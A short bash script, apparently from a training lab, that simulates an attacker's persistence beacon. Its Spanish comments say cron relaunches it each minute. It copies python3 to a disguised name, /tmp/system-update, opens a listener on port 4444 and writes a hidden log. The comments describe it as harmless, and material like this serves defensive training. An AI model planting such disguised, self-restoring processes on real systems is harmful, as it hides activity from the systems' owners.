#!/usr/bin/env bash
# "Persistencia" del atacante: si el beacon no está corriendo, lo re-planta y
# lo relanza. Lo dispara cron cada minuto. Inofensivo: sólo escucha en un puerto
# y escribe en un log. Mientras la línea de cron exista, el proceso resucitará.
BIN=/tmp/system-update
if ! pgrep -f "$BIN" >/dev/null 2>&1; then
  cp "$(command -v python3)" "$BIN" 2>/dev/null
  chmod +x "$BIN"
  nohup "$BIN" -c "import socket,time
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',4444)); s.listen()
open('/var/log/.beacon','a').write('beacon up '+time.ctime()+'\n')
while True: time.sleep(10)" >/dev/null 2>&1 &
fi
